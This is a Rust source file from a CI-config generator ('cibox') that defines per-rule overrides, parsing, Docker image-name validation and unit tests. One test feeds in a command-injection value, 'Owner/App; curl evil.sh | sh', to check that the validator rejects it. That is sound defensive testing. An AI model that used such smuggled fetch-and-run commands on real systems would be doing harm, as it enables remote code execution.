use serde::{Deserialize, Serialize};

use crate::error::Result;

/// cibox.ron: per-rule overrides from the detected defaults, nix-services
/// style — one entry per rule with an `enabled` override plus whatever knobs
/// the rule supports. The file itself is optional and every field in it is
/// optional — an empty `()` (or no file at all) means "do whatever detection
/// decides". The target platform is not configured here: it comes from
/// `--platform` or is inferred from existing CI files and the git remote.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct CiboxConfig {
    /// Run cargo test with all features on every push. Accepts toolchain
    /// versions: "stable", "nightly", or "x.y[.z]".
    #[serde(skip_serializing_if = "is_default")]
    pub rust_test: VersionedRule,
    /// Check code formatting with cargo fmt
    #[serde(skip_serializing_if = "is_default")]
    pub rust_fmt: RuleToggle,
    /// Run clippy with warnings denied
    #[serde(skip_serializing_if = "is_default")]
    pub rust_clippy: RuleToggle,
    /// Audit dependencies for known vulnerabilities
    #[serde(skip_serializing_if = "is_default")]
    pub rust_audit: RuleToggle,
    /// Build documentation on nightly with RUSTDOCFLAGS=--cfg docsrs
    #[serde(skip_serializing_if = "is_default")]
    pub rust_doc: RuleToggle,
    /// Check the build with the rust-version declared in Cargo.toml
    #[serde(skip_serializing_if = "is_default")]
    pub rust_msrv: RuleToggle,
    /// Check all feature combinations are additive with cargo-hack
    #[serde(skip_serializing_if = "is_default")]
    pub rust_feature_combos: RuleToggle,
    /// Test with the minimal dependency versions Cargo.toml permits
    #[serde(skip_serializing_if = "is_default")]
    pub rust_minimal_versions: RuleToggle,
    /// Publish to crates.io on version tags (requires CARGO_REGISTRY_TOKEN)
    #[serde(skip_serializing_if = "is_default")]
    pub rust_release: RuleToggle,
    /// Install the package and run pytest on every push. Accepts toolchain
    /// versions as tags of the official python image, e.g. "3.13".
    #[serde(skip_serializing_if = "is_default")]
    pub python_test: VersionedRule,
    /// Lint with ruff
    #[serde(skip_serializing_if = "is_default")]
    pub python_lint: RuleToggle,
    /// Check code formatting with ruff
    #[serde(skip_serializing_if = "is_default")]
    pub python_fmt: RuleToggle,
    /// Build and upload to PyPI on version tags (requires TWINE_PASSWORD)
    #[serde(skip_serializing_if = "is_default")]
    pub python_release: RuleToggle,
    /// Run go test on every push. Accepts toolchain versions as tags of the
    /// official golang image, e.g. "1.24".
    #[serde(skip_serializing_if = "is_default")]
    pub go_test: VersionedRule,
    /// Compile all packages
    #[serde(skip_serializing_if = "is_default")]
    pub go_build: RuleToggle,
    /// Lint with golangci-lint
    #[serde(skip_serializing_if = "is_default")]
    pub go_lint: RuleToggle,
    /// Scan for security problems with gosec
    #[serde(skip_serializing_if = "is_default")]
    pub go_audit: RuleToggle,
    /// Install dependencies and run the package.json test script. Accepts
    /// toolchain versions as tags of the official node image, e.g. "22";
    /// ignored for bun projects.
    #[serde(skip_serializing_if = "is_default")]
    pub node_test: VersionedRule,
    /// Run the package.json lint script
    #[serde(skip_serializing_if = "is_default")]
    pub node_lint: RuleToggle,
    /// Type-check TypeScript with tsc --noEmit. Needs `typescript` among the
    /// project's dependencies: the compiler is run from node_modules/.bin,
    /// never downloaded.
    #[serde(skip_serializing_if = "is_default")]
    pub node_typecheck: RuleToggle,
    /// Check formatting with prettier. Needs `prettier` among the project's
    /// dependencies, as above.
    #[serde(skip_serializing_if = "is_default")]
    pub node_fmt: RuleToggle,
    /// Run zig build test on every push
    #[serde(skip_serializing_if = "is_default")]
    pub zig_test: RuleToggle,
    /// Check formatting with zig fmt
    #[serde(skip_serializing_if = "is_default")]
    pub zig_fmt: RuleToggle,
    /// Compile the project with zig build
    #[serde(skip_serializing_if = "is_default")]
    pub zig_build: RuleToggle,
    /// Configure, build, and run ctest
    #[serde(skip_serializing_if = "is_default")]
    pub cmake_test: RuleToggle,
    /// Configure and build with CMake in Release mode
    #[serde(skip_serializing_if = "is_default")]
    pub cmake_build: RuleToggle,
    /// Check formatting with clang-format (requires .clang-format)
    #[serde(skip_serializing_if = "is_default")]
    pub cmake_fmt: RuleToggle,
    /// Build the Dockerfile on every push
    #[serde(skip_serializing_if = "is_default")]
    pub docker_build: DockerRule,
    /// Build and push the image to a registry on version tags
    #[serde(skip_serializing_if = "is_default")]
    pub docker_release: DockerReleaseRule,
    /// Scan the full git history for hardcoded secrets
    #[serde(skip_serializing_if = "is_default")]
    pub gitleaks: RuleToggle,
}

/// Override for a rule without knobs
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct RuleToggle {
    /// Force this rule on or off; omit to let detection decide
    #[serde(skip_serializing_if = "Option::is_none")]
    pub enabled: Option<bool>,
}

/// Override for a test rule that supports a toolchain-version matrix
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct VersionedRule {
    /// Force this rule on or off; omit to let detection decide
    #[serde(skip_serializing_if = "Option::is_none")]
    pub enabled: Option<bool>,
    /// Toolchain versions to test against, lowered to the platform's native
    /// job matrix. A single version pins the image; omit for the default.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub versions: Option<Vec<String>>,
}

/// Override for the docker-build rule: toggle plus image name
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct DockerRule {
    /// Force this rule on or off; omit to let detection decide
    #[serde(skip_serializing_if = "Option::is_none")]
    pub enabled: Option<bool>,
    /// Image name, e.g. "fossable/cibox". Setting it on either docker rule
    /// applies to both; the default is derived from the git remote. Must be a
    /// valid docker reference: lowercase, optionally with a registry host and
    /// a `:tag`.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub image_name: Option<String>,
}

/// Override for the docker-release rule: toggle, image name, and target
/// platforms. The push authenticates with GITHUB_TOKEN for ghcr.io images,
/// or with DOCKER_USERNAME/DOCKER_PASSWORD against the registry host in the
/// image name (Docker Hub when there is none); login is skipped when the
/// credentials aren't configured, for registries that don't require any. On
/// GitHub/Gitea the credentials are read from repository Secrets, falling
/// back to Variables for values that needn't be secret (e.g. the username).
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct DockerReleaseRule {
    /// Force this rule on or off; omit to let detection decide
    #[serde(skip_serializing_if = "Option::is_none")]
    pub enabled: Option<bool>,
    /// Image name, e.g. "fossable/cibox". Setting it on either docker rule
    /// applies to both; the default is derived from the git remote. Must be a
    /// valid docker reference: lowercase, optionally with a registry host and
    /// a `:tag` — though not a tag when `platforms` is set, since multi-arch
    /// staging tags are appended to it.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub image_name: Option<String>,
    /// Target platforms for a multi-arch image, e.g. [LinuxAmd64, LinuxArm64].
    /// Omit for a plain single-arch build on the host runner. Linux platforms
    /// build in one buildx+QEMU job; WindowsAmd64 adds a Windows-runner job
    /// (GitHub/Gitea only, and the Dockerfile must support a Windows base) and
    /// the final tag becomes a merged multi-platform manifest.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub platforms: Option<Vec<DockerPlatform>>,
    /// Sync README.md to the Docker Hub repository description during the
    /// release job (via chko/docker-pushrm, reusing DOCKER_USERNAME and
    /// DOCKER_PASSWORD). Docker Hub only — ignored for ghcr.io images and
    /// Windows-only releases, and skipped at runtime when the credentials
    /// aren't configured or there is no README.md. Omit for off.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub sync_readme: Option<bool>,
}

/// A target platform for a multi-arch docker image
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum DockerPlatform {
    /// linux/amd64
    LinuxAmd64,
    /// linux/arm64
    LinuxArm64,
    /// linux/arm/v7 (32-bit ARM)
    LinuxArmV7,
    /// linux/riscv64
    LinuxRiscv64,
    /// windows/amd64 — built on a Windows runner; GitHub/Gitea only
    WindowsAmd64,
}

impl DockerPlatform {
    pub const ALL: [DockerPlatform; 5] = [
        DockerPlatform::LinuxAmd64,
        DockerPlatform::LinuxArm64,
        DockerPlatform::LinuxArmV7,
        DockerPlatform::LinuxRiscv64,
        DockerPlatform::WindowsAmd64,
    ];

    /// The docker platform string, e.g. "linux/amd64"
    pub fn as_str(&self) -> &'static str {
        match self {
            DockerPlatform::LinuxAmd64 => "linux/amd64",
            DockerPlatform::LinuxArm64 => "linux/arm64",
            DockerPlatform::LinuxArmV7 => "linux/arm/v7",
            DockerPlatform::LinuxRiscv64 => "linux/riscv64",
            DockerPlatform::WindowsAmd64 => "windows/amd64",
        }
    }

    pub fn is_windows(&self) -> bool {
        matches!(self, DockerPlatform::WindowsAmd64)
    }
}

/// Whether a value still holds every one of its defaults. A rule entry that
/// overrides nothing is left out of the serialized document, which is what
/// keeps cibox.ron delta-only; asking `Default` means a newly added knob is
/// covered without a second list of fields to keep in step.
fn is_default<T: Default + PartialEq>(value: &T) -> bool {
    *value == T::default()
}

/// The `CiboxConfig` field a kebab-case rule id maps to
fn field_name(rule_id: &str) -> String {
    rule_id.replace('-', "_")
}

/// Define the id-keyed override accessors from one list of [`CiboxConfig`]
/// fields. A rule's id is its field name in kebab-case, so the ids are
/// derived instead of written out a second time, and a rule cannot end up
/// readable through the getter but silently ignored by the setter.
macro_rules! rule_overrides {
    (enabled: [$($rule:ident),+ $(,)?], versions: [$($versioned:ident),+ $(,)?] $(,)?) => {
        impl CiboxConfig {
            /// The `enabled` override for a rule by its kebab-case id
            pub fn enabled_override(&self, rule_id: &str) -> Option<bool> {
                match field_name(rule_id).as_str() {
                    $(stringify!($rule) => self.$rule.enabled,)+
                    _ => None,
                }
            }

            /// Set the `enabled` override for a rule by its kebab-case id
            pub fn set_enabled_override(&mut self, rule_id: &str, enabled: Option<bool>) {
                match field_name(rule_id).as_str() {
                    $(stringify!($rule) => self.$rule.enabled = enabled,)+
                    _ => {}
                }
            }

            /// The `versions` override for a test rule by its kebab-case id
            pub fn versions_override(&self, rule_id: &str) -> Option<&Vec<String>> {
                match field_name(rule_id).as_str() {
                    $(stringify!($versioned) => self.$versioned.versions.as_ref(),)+
                    _ => None,
                }
            }

            /// Set the `versions` override for a test rule by its kebab-case id
            pub fn set_versions_override(&mut self, rule_id: &str, versions: Option<Vec<String>>) {
                match field_name(rule_id).as_str() {
                    $(stringify!($versioned) => self.$versioned.versions = versions,)+
                    _ => {}
                }
            }
        }
    };
}

rule_overrides! {
    enabled: [
        rust_test,
        rust_fmt,
        rust_clippy,
        rust_audit,
        rust_doc,
        rust_msrv,
        rust_feature_combos,
        rust_minimal_versions,
        rust_release,
        python_test,
        python_lint,
        python_fmt,
        python_release,
        go_test,
        go_build,
        go_lint,
        go_audit,
        node_test,
        node_lint,
        node_typecheck,
        node_fmt,
        zig_test,
        zig_fmt,
        zig_build,
        cmake_test,
        cmake_build,
        cmake_fmt,
        docker_build,
        docker_release,
        gitleaks,
    ],
    versions: [rust_test, python_test, go_test, node_test],
}

impl CiboxConfig {
    pub fn is_default(&self) -> bool {
        is_default(self)
    }
}

/// Parse a cibox.ron document
pub fn parse_config(ron_str: &str) -> Result<CiboxConfig> {
    if ron_str.trim_start().starts_with('[') {
        anyhow::bail!(
            "cibox.ron uses the old pipeline-list format, which has been replaced \
             by rule overrides. Delete the file and re-run cibox, or see the README \
             for the new format."
        );
    }
    let config: CiboxConfig = crate::config::ron_options()
        .from_str(ron_str)
        .map_err(|e| {
            let msg = e.to_string();
            if msg.contains("`platform`") || msg.contains("`rules`") {
                anyhow::anyhow!(
                    "{msg}\ncibox.ron no longer has `platform` or `rules` fields: rule \
                     overrides live at the top level, e.g. `(rust_test: (enabled: false))`, \
                     and the platform comes from --platform or is inferred"
                )
            } else {
                e.into()
            }
        })?;
    validate_image_names(&config)?;
    Ok(config)
}

/// Image names are interpolated into `docker build -t <image> .` in the
/// generated pipeline, so a malformed one is a config error rather than
/// something to quietly rewrite.
fn validate_image_names(config: &CiboxConfig) -> Result<()> {
    let build = config.docker_build.image_name.as_deref();
    let release = config.docker_release.image_name.as_deref();
    validate_image_name("docker_build", build)?;
    validate_image_name("docker_release", release)
}

fn validate_image_name(field: &str, name: Option<&str>) -> Result<()> {
    match name {
        Some(name) if !crate::config::image::is_valid_reference(name) => anyhow::bail!(
            "{field}.image_name {name:?} is not a valid docker image reference. \
             Repository names are lowercase alphanumerics separated by `.`, `-` \
             or `_`, optionally prefixed with a registry host and suffixed with \
             a `:tag`, e.g. \"ghcr.io/owner/app\"."
        ),
        _ => Ok(()),
    }
}

/// Serialize a config as a pretty cibox.ron document
pub fn serialize_config(config: &CiboxConfig) -> Result<String> {
    let pretty = ron::ser::PrettyConfig::new()
        .depth_limit(4)
        .separate_tuple_members(true)
        .enumerate_arrays(false);
    crate::config::ron_options()
        .to_string_pretty(config, pretty)
        .map_err(|e| anyhow::anyhow!("Failed to serialize to RON: {}", e))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_empty_config() {
        let config = parse_config("()").unwrap();
        assert!(config.is_default());
    }

    #[test]
    fn test_parse_overrides() {
        let config = parse_config(
            r#"(
                rust_release: (enabled: false),
                docker_build: (enabled: true, image_name: "fossable/cibox"),
            )"#,
        )
        .unwrap();
        assert_eq!(config.rust_release.enabled, Some(false));
        assert_eq!(config.docker_build.enabled, Some(true));
        assert_eq!(
            config.docker_build.image_name.as_deref(),
            Some("fossable/cibox")
        );
        // Unlisted rules follow detection
        assert_eq!(config.rust_test.enabled, None);
    }

    #[test]
    fn test_knob_without_enabled_leaves_detection_in_charge() {
        let config = parse_config(r#"(docker_build: (image_name: "a/b"))"#).unwrap();
        assert_eq!(config.docker_build.enabled, None);
        assert_eq!(config.docker_build.image_name.as_deref(), Some("a/b"));
    }

    #[test]
    fn test_serialize_is_delta_only() {
        let mut config = CiboxConfig::default();
        config.rust_release.enabled = Some(false);
        let ron_str = serialize_config(&config).unwrap();
        assert!(ron_str.contains("rust_release"), "{ron_str}");
        assert!(!ron_str.contains("rust_test"), "{ron_str}");

        let parsed = parse_config(&ron_str).unwrap();
        assert_eq!(parsed, config);
    }

    #[test]
    fn test_malformed_image_name_is_rejected() {
        for field in ["docker_build", "docker_release"] {
            let err = parse_config(&format!(
                r#"({field}: (image_name: "Owner/App; curl evil.sh | sh"))"#
            ))
            .unwrap_err();
            let msg = err.to_string();
            assert!(msg.contains(field), "{msg}");
            assert!(msg.contains("not a valid docker image reference"), "{msg}");
        }
    }

    #[test]
    fn test_registry_host_and_tag_are_accepted() {
        let config =
            parse_config(r#"(docker_release: (image_name: "ghcr.io/owner/app"))"#).unwrap();
        assert_eq!(
            config.docker_release.image_name.as_deref(),
            Some("ghcr.io/owner/app")
        );
        assert!(parse_config(r#"(docker_build: (image_name: "owner/app:edge"))"#).is_ok());
        assert!(parse_config(r#"(docker_build: (image_name: "localhost:5000/app"))"#).is_ok());
    }

    #[test]
    fn test_parse_docker_platforms() {
        let config =
            parse_config(r#"(docker_release: (platforms: [LinuxArm64, WindowsAmd64]))"#).unwrap();
        assert_eq!(
            config.docker_release.platforms,
            Some(vec![
                DockerPlatform::LinuxArm64,
                DockerPlatform::WindowsAmd64
            ])
        );
        assert_eq!(config.docker_release.enabled, None);
    }

    #[test]
    fn test_docker_platforms_round_trip() {
        let mut config = CiboxConfig::default();
        config.docker_release.platforms =
            Some(vec![DockerPlatform::LinuxAmd64, DockerPlatform::LinuxArm64]);
        let ron_str = serialize_config(&config).unwrap();
        assert!(ron_str.contains("platforms"), "{ron_str}");
        assert!(!ron_str.contains("image_name"), "{ron_str}");
        assert_eq!(parse_config(&ron_str).unwrap(), config);
    }

    #[test]
    fn test_parse_sync_readme() {
        let config = parse_config(r#"(docker_release: (sync_readme: true))"#).unwrap();
        assert_eq!(config.docker_release.sync_readme, Some(true));
        assert_eq!(config.docker_release.enabled, None);
    }

    #[test]
    fn test_sync_readme_round_trip_is_delta_only() {
        let mut config = CiboxConfig::default();
        config.docker_release.sync_readme = Some(true);
        assert!(!config.is_default());
        let ron_str = serialize_config(&config).unwrap();
        assert!(ron_str.contains("sync_readme"), "{ron_str}");
        assert!(!ron_str.contains("image_name"), "{ron_str}");
        assert!(!ron_str.contains("platforms"), "{ron_str}");
        assert_eq!(parse_config(&ron_str).unwrap(), config);
    }

    #[test]
    fn test_platform_and_rules_fields_rejected_with_hint() {
        for old in [
            "(platform: GitHub)",
            "(rules: (rust_test: (enabled: false)))",
        ] {
            let err = parse_config(old).unwrap_err();
            assert!(err.to_string().contains("top level"), "{old}: {err}");
        }
    }

    #[test]
    fn test_old_format_rejected_with_hint() {
        let err = parse_config(
            r#"[
                ( platform: GitHub, presets: [ Rust(enable_linter: true) ] ),
            ]"#,
        )
        .unwrap_err();
        assert!(err.to_string().contains("old pipeline-list format"));
    }

    #[test]
    fn test_parse_versions() {
        let config = parse_config(r#"(rust_test: (versions: ["1.90", "nightly"]))"#).unwrap();
        assert_eq!(
            config.rust_test.versions,
            Some(vec!["1.90".to_string(), "nightly".to_string()])
        );
        // Versions alone leave detection in charge of enablement
        assert_eq!(config.rust_test.enabled, None);
    }

    #[test]
    fn test_versions_round_trip_is_delta_only() {
        let mut config = CiboxConfig::default();
        config.go_test.versions = Some(vec!["1.23".to_string(), "1.24".to_string()]);
        let ron_str = serialize_config(&config).unwrap();
        assert!(ron_str.contains("versions"), "{ron_str}");
        assert!(!ron_str.contains("enabled"), "{ron_str}");
        assert!(!ron_str.contains("rust_test"), "{ron_str}");
        assert_eq!(parse_config(&ron_str).unwrap(), config);
    }

    #[test]
    fn test_versions_override_round_trip() {
        let mut config = CiboxConfig::default();
        config.set_versions_override("node-test", Some(vec!["22".to_string()]));
        assert_eq!(
            config.versions_override("node-test"),
            Some(&vec!["22".to_string()])
        );
        config.set_versions_override("node-test", None);
        assert!(config.is_default());
    }

    #[test]
    fn test_enabled_override_round_trip() {
        let mut config = CiboxConfig::default();
        config.set_enabled_override("python-fmt", Some(true));
        assert_eq!(config.enabled_override("python-fmt"), Some(true));
        config.set_enabled_override("python-fmt", None);
        assert!(config.is_default());
    }
}
